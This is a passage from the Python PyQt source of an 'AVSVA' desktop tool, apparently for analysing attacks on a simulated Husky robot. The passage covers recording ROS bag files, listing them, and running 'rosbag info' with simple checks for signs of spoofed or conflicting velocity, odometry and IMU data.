            self.start_rec_btn.setEnabled(True)
        else:
            self.status_indicator.setText("● Stopped")
            self.status_indicator.setStyleSheet("color: #dc2626;")
            self.start_rec_btn.setEnabled(False)
    
    def start_recording(self):
        """Start bag file recording"""
        self.bag_recorder = BagRecorder()
        self.bag_recorder.log_signal.connect(self.add_log)
        self.bag_recorder.status_signal.connect(self.update_rec_status)
        self.bag_recorder.start()
        
        self.start_rec_btn.setEnabled(False)
        self.stop_rec_btn.setEnabled(True)
    
    def stop_recording(self):
        """Stop bag file recording"""
        if self.bag_recorder:
            self.bag_recorder.stop()
            self.bag_recorder.wait()
        
        self.start_rec_btn.setEnabled(True)
        self.stop_rec_btn.setEnabled(False)
        
        # Refresh bag list
        self.refresh_bag_list()
    
    def update_rec_status(self, recording):
        """Update recording status indicator"""
        if recording:
            self.rec_indicator.setText("● Recording")
            self.rec_indicator.setStyleSheet("color: #dc2626;")
        else:
            self.rec_indicator.setText("● Not Recording")
            self.rec_indicator.setStyleSheet("color: #6b7280;")
    
    def refresh_bag_list(self):
        """Refresh the list of bag files"""
        self.bag_list.clear()
        
        bags_dir = os.path.join(os.path.dirname(__file__), 'recorded_bags')
        if os.path.exists(bags_dir):
            bag_files = [f for f in os.listdir(bags_dir) if f.endswith('.bag')]
            bag_files.sort(reverse=True)  # Most recent first
            
            for bag_file in bag_files:
                self.bag_list.addItem(bag_file)
            
            self.add_log(f"Found {len(bag_files)} bag files")
        else:
            self.add_log("No recorded bags directory found")
    
    def load_bag_file(self, item):
        """Load and analyze a bag file"""
        bag_filename = item.text()
        bags_dir = os.path.join(os.path.dirname(__file__), 'recorded_bags')
        bag_path = os.path.join(bags_dir, bag_filename)
        
        self.analyze_bag_file(bag_path)
    
    def load_external_bag(self):
        """Load an external bag file"""
        filename, _ = QFileDialog.getOpenFileName(
            self,
            "Select Bag File",
            "",
            "Bag Files (*.bag);;All Files (*)"
        )
        
        if filename:
            self.analyze_bag_file(filename)
    
    def analyze_bag_file(self, bag_path):
        """Analyze a bag file using rosbag info"""
        try:
            self.analysis_output.clear()
            self.analysis_output.append(f"Analyzing: {os.path.basename(bag_path)}\n")
            self.analysis_output.append("=" * 80 + "\n")
            
            # Run rosbag info
            result = subprocess.run(
                ['rosbag', 'info', bag_path],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                self.analysis_output.append(result.stdout)
                self.add_log(f"Analyzed bag file: {os.path.basename(bag_path)}")
            else:
                self.analysis_output.append(f"Error analyzing bag file:\n{result.stderr}")
                self.add_log(f"Error analyzing bag file: {os.path.basename(bag_path)}")
            
            # Add some additional analysis
            self.analysis_output.append("\n" + "=" * 80)
            self.analysis_output.append("\nAVSVA Analysis:")
            self.analysis_output.append("-" * 80)
            
            # Check for attack indicators
            if '/husky_velocity_controller/cmd_vel' in result.stdout:
                self.analysis_output.append("\n✓ CMD_VEL topic found - check for conflicting commands")
            
            if '/husky_velocity_controller/odom' in result.stdout:
                self.analysis_output.append("✓ Odometry topic found - analyze for spoofing patterns")
            
            if '/imu/data' in result.stdout:
                self.analysis_output.append("✓ IMU topic found - check for anomalous sensor readings")
            
            self.analysis_output.append("\n\nTo further analyze this bag file, use:")
            self.analysis_output.append(f"  rosbag play {bag_path}")
            self.analysis_output.append(f"  rostopic echo /husky_velocity_controller/cmd_vel")
            
        except subprocess.TimeoutExpired:
            self.analysis_output.append("Error: Analysis timed out")
            self.add_log("Bag file analysis timed out")
        except Exception as e:
            self.analysis_output.append(f"Error: {str(e)}")
            self.add_log(f"Error analyzing bag file: {str(e)}")
    
    def closeEvent(self, event):
        """Handle application close"""
        # Stop simulation and recording if running
        if self.simulation_controller and self.simulation_controller.running:
            self.stop_simulation()
        
        if self.bag_recorder and self.bag_recorder.recording:
            self.stop_recording()
        
        event.accept()


def main():
    app = QApplication(sys.argv)
    
    # Set application-wide font
    font = QFont('Arial', 10)
    app.setFont(font)
    
    window = AVSVAMainWindow()
    window.show()
    
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()